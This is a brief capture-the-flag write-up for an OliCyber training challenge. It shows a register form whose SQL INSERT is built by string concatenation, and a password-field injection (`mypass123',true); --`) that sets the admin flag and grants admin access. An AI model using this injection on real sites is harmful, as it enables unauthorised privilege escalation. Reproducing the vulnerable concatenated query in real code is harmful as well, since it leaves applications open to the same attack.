# Admin's secret
[> *Challenge (500)*](https://training.olicyber.it/challenges#challenge-48)

## Solution
As the hint says we need to exploit the register form.

By looking at the register page we can see the SQL query:
```sql
INSERT INTO users(username,password,admin) VALUES ('" . $username . "','" . $password . "',false);
```
```sql
INSERT INTO users(username,password,admin) VALUES ('username', 'password', false);
```
The `admin` field is just a boolean so we can SQL Inject to make it true.
```bash
username = username1230x
password = mypass123',true); --
```
making our sql query:
```sql
INSERT INTO users(username,password,admin) VALUES ('username1230x','mypass123',true); -- ',false);
```

Then we just login and get the flag
